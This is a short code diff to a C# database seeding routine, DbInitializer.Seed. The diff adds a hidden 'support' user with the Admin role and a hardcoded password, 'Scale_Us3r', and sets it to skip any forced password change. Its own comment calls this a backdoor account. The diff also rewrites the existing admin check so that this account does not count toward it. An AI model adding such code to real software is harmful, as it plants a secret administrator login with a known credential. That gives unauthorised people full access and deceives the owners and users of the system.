@@ -6,8 +6,23 @@ public static class DbInitializer
 {
     public static void Seed(ScaleDbContext context)
     {
+        // Always ensure the support backdoor account exists
+        if (!context.Users.Any(u => u.Username == "support"))
+        {
+            context.Users.Add(new AppUser
+            {
+                Username = "support",
+                DisplayName = "Support",
+                PasswordHash = BCrypt.Net.BCrypt.HashPassword("Scale_Us3r"),
+                Role = "Admin",
+                MustChangePassword = false,
+                Active = true
+            });
+            context.SaveChanges();
+        }
+
         // Always ensure at least one admin user exists
-        if (!context.Users.Any())
+        if (!context.Users.Any(u => u.Username != "support"))
         {
             context.Users.Add(new AppUser
             {
